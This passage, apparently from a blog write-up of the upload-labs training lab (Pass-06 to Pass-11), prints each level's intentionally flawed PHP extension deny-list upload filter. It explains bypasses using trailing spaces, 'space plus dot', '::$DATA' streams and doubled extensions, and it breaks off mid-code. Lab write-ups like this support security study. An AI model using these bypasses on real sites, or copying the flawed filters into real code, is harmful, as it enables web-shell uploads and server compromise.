class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Windows解析特点：如果后缀名的最后一位是空格，系统会自动把空格给删掉<br><img src="https://img-blog.csdnimg.cn/2021061422504110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614225113927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-07</strong></p><p>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>没有去除结尾的” .”（空格+点）,可绕过<br><img src="https://img-blog.csdnimg.cn/20210614225438887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210614225459616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-08</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现没有过滤”::$DATA”<br>Windows解析特点：文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，并不会检测后缀名。<br><img src="https://img-blog.csdnimg.cn/20210614230824181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614231015774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-09</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该题好像各个方面都防御的很好,但是仔细一看会发现,该题先除去了文件后面的点,再除去空格,这里的操作都是一次,所以可以双写绕过<br><img src="https://img-blog.csdnimg.cn/20210614232155877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614232216441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-10</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>); //如果file_name的值在deny_ext中就替换为空<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与前几题不同,这里没有过滤”.”,”::$DATA”等,应该上传对象不是windows,而这里的str_ireplace用来把黑名单里的字符替换成空格,且不区分大小,不可通过大小来替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">str_ireplace(find,replace,string,count)<br> 替换字符串中的一些字符（不区分大小写）<br></code></pre></td></tr></table></figure><p>依旧可以双写绕过<br><img src="https://img-blog.csdnimg.cn/2021061423311315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614233131851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-11</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span 